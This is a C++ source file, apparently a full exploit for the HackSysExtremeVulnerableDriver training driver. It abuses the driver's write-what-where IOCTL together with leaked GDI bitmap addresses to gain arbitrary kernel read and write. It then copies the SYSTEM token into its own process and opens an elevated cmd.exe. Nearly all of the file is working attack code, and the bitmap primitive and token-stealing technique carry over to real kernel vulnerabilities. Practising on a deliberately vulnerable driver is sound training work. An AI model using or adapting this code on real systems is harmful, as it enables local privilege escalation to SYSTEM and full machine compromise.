#include<Windows.h>
#include<cstdio>
#include<winternl.h>
#include<psapi.h>

static VOID
xxCreateCmdLineProcess(VOID) {
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOW;
    WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
    BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi); // 创建cmd子进程
    if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
}

HANDLE hDevide;
HBITMAP ManagerHandle;
HBITMAP WorkHandle;

ULONG64 UniqueProcessIdOffset = 0x2e8;
ULONG64 TokenOffset = 0x358;
ULONG64 ActiveProcessLinks = 0x2f0;

typedef struct _USER_HANDLE_ENTRY {
    VOID* pKernel;
    union {
        PVOID pi;
        PVOID pti;
        PVOID ppi;
    };
    BYTE type;
    BYTE flags;
    WORD generation;
} USER_HANDLE_ENTRY, * PUSER_HANDLE_ENTRY;
typedef struct _SERVERINFO {
    DWORD dwSRVIFlags;
    DWORD cHandleEntries;
    WORD wSRVIFlags;
    WORD wRIPPID;
    WORD wRIPError;
}SERVERINFO, * PSERVERINFO;
typedef struct _SHAREDINFO {
    PSERVERINFO psi;
    PUSER_HANDLE_ENTRY aheList;
    ULONG HeEntrySize;
    ULONG_PTR pDispInfo;
    ULONG_PTR ulSharedDelta;
    ULONG_PTR awmControl;
    ULONG_PTR DefWindowMsgs;
    ULONG_PTR DefWindowSpecMsgs;
}SHAREDINFO, * PSHAREDINFO;

PUSER_HANDLE_ENTRY GetEntryFromHandle(HANDLE handle) {
    PUSER_HANDLE_ENTRY addr = 0;
    HMODULE hUser32 = LoadLibraryA("user32.dll");
    if (!hUser32) {
        printf("Load user32 error\n");
        exit(1);
    }
    PSHAREDINFO pSharedInfo = (PSHAREDINFO)GetProcAddress(hUser32, "gSharedInfo");
    if (!pSharedInfo) {
        printf("Get gSharedInfo error\n");
        exit(1);
    }
    //printf("pSharedInfo:%p\n", pSharedInfo);
    PUSER_HANDLE_ENTRY gHandleTable = pSharedInfo->aheList;
    //printf("ahelist:%p\n",gHandleTable);
    DWORD index = LOWORD(handle);
    addr = &gHandleTable[index];
    return addr;
}




BOOL init() {
    hDevide = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",
        GENERIC_READ | GENERIC_WRITE,
        NULL,
        NULL,
        OPEN_EXISTING,
        NULL,
        NULL);
    if (hDevide == INVALID_HANDLE_VALUE) {
        printf("Create Device Fail:0x%X\n", GetLastError());
        return FALSE;
    }
    else
        return TRUE;
}

void BitmapRead(PULONG64 addr, PULONG64 result) {
    SetBitmapBits(ManagerHandle, 8, &addr);
    GetBitmapBits(WorkHandle, 8, result);
}
void BitmapWrite(PULONG64 addr, ULONG64 value) {
    SetBitmapBits(ManagerHandle, 8, &addr);
    SetBitmapBits(WorkHandle, 8, &value);
}

void GetSystemEprocess(PULONGLONG systemEprocess) {
    LPVOID drivers[1024];
    DWORD cbNeeded;
    PVOID ntoskrnlBase;
    int cDrivers, i;

    if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers))
    {
        ntoskrnlBase = drivers[0];
    }
    else
    {
        printf("EnumDeviceDrivers failed; array size needed is %d\n", cbNeeded / sizeof(LPVOID));
        return ;
    }

    HMODULE hLoaded = LoadLibrary(L"ntoskrnl.exe");
    if (!hLoaded) {
        printf("Load ntoskrnl.exe error\n");
        return;
    }
    PVOID addr = GetProcAddress(hLoaded, "PsInitialSystemProcess");
    if (!addr) {
        printf("Get PsInitialSystemProcess error\n");
        return;
    }
    ULONGLONG offset = (ULONGLONG)addr - (ULONGLONG)hLoaded;
    BitmapRead((PULONG64)(offset + (ULONGLONG)ntoskrnlBase), (PULONG64)systemEprocess);
    if (!*systemEprocess) {
        printf("Read system EPROCESS error\n");
        return;
    }
}
HBITMAP LeakBitmap(PULONG64 kernelBase) {
    LPVOID Buffer = VirtualAlloc(0, 10000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!Buffer) {
        printf("Alloc buffer error\n");
        return 0;
    }
    HACCEL haccelHandle = 0;
    HACCEL haccelHandlePre = 0;
    PUSER_HANDLE_ENTRY addr = 0;
    PVOID kernelBasePre = 0;

    while (1) {
        //---------------pre--------------------
        haccelHandlePre = CreateAcceleratorTableA((LPACCEL)Buffer, 700);
        if (!haccelHandlePre) {
            printf("Create Accelerator Table error\n");
            return 0;
        }
        addr = GetEntryFromHandle(haccelHandlePre);
        kernelBasePre = addr->pKernel;
        //printf("pre_kernel:%p\n", kernelBasePre);
        if (!DestroyAcceleratorTable(haccelHandlePre)) {
            printf("Destroy Accelerator Table error\n");
            return 0;
        }
        //-------------------------------------
        haccelHandle = CreateAcceleratorTableA((LPACCEL)Buffer, 700);
        if (!haccelHandle) {
            printf("Create Accelerator Table error\n");
            return 0;
        }
        addr = GetEntryFromHandle(haccelHandle);
        *kernelBase = (ULONG64)addr->pKernel;
        //printf("kernel:%p\n", *kernelBase);
        if (!DestroyAcceleratorTable(haccelHandle)) {
            printf("Destroy Accelerator Table error\n");
            return 0;
        }
        if ((ULONG64)kernelBasePre == *kernelBase) {
            break;
        }
    }
    LPVOID BufferBitmap = VirtualAlloc(0, 0x50 * 2 * 4, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!BufferBitmap) {
        printf("Alloc Bitmap Buffer error\n");
        return 0;
    }
    memset(BufferBitmap, 'A', 0x10);
    HBITMAP hbitmap = CreateBitmap(0x701, 2, 1, 8, BufferBitmap);
    if (!hbitmap) {
        printf("Create Bitmap error\n");
        return 0;
    }
    return hbitmap;
}
int main() {

    ULONG64 kernelBaseMana = 0;
    ULONG64 kernelBaseWork = 0;
    
    ManagerHandle =  LeakBitmap(&kernelBaseMana);
    if (!kernelBaseMana) {
        printf("Leak Manager Bitmap error\n");
        return 1;
    }
    PULONG64 ManapvScan0 = (PULONG64)(kernelBaseMana + 0x50);
    WorkHandle = LeakBitmap(&kernelBaseWork);
    if (!kernelBaseWork) {
        printf("Leak Worker Bitmap error\n");
        return 1;
    }
    PULONG64 WorkpvScan0 = (PULONG64)(kernelBaseWork + 0x50);
    /*system("pause");
    __debugbreak();*/

    DWORD CurrentPID = GetCurrentProcessId();
    printf("[+]Pid:%d\n", CurrentPID);

    if (!init())
        exit(1);
    struct {
        PULONG64 what;
        PULONG64 where;
    }UserWriteWhatWhere = { (PULONG64)&WorkpvScan0, ManapvScan0 };
    DWORD recvBuf;
    DeviceIoControl(hDevide, 0x22200B, &UserWriteWhatWhere, sizeof(UserWriteWhatWhere), NULL, 0, &recvBuf, NULL);

    ULONGLONG systemEprocess = 0;
    GetSystemEprocess(&systemEprocess);
    printf("[+]System EPROCESS:%p\n", systemEprocess);
    ULONG64 SystemToken = 0;
    BitmapRead((PULONG64)(systemEprocess + TokenOffset), &SystemToken);

    ULONG64 Eprocess = systemEprocess;
    ULONG64 PID = 0;
    ULONG64 CurrentToken = 0;
    do {
        BitmapRead((PULONG64)(Eprocess + ActiveProcessLinks), &Eprocess);
        Eprocess -= ActiveProcessLinks;
        BitmapRead((PULONG64)(Eprocess + UniqueProcessIdOffset), &PID);
        BitmapRead((PULONG64)(Eprocess + TokenOffset), &CurrentToken);
        //printf("[+]PID:%lld.Token:%p\n",PID,CurrentToken);
    } while (PID != CurrentPID);
    printf("[+]Current EPROCESS:%p\n", Eprocess);
    BitmapWrite((PULONG64)(Eprocess + TokenOffset), SystemToken);
    xxCreateCmdLineProcess();

    return 0;
}